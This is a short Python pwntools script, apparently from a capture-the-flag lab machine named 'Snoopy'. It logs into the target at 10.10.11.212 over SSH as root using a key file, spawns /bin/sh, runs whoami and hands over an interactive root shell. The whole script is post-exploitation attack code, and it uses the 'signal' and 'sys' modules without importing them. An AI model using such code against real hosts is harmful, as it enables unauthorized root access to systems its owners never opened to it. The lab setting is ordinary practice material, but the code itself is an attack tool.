from pwn import *
import subprocess
import string
import argparse
import time
import os

try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Snoopy - Ninhpn1337\n")
    time.sleep(0.5)

except:
    print('\n[\033[1;31m!\033[1;37m] Root please\n\n[\033[1;31m!\033[1;37m] \n')
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Quit!\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

request = ssh(host='10.10.11.212', user='root', keyfile='key')
shell = request.process("/bin/sh")
shell.sendline(b"whoami")
shell.interactive()
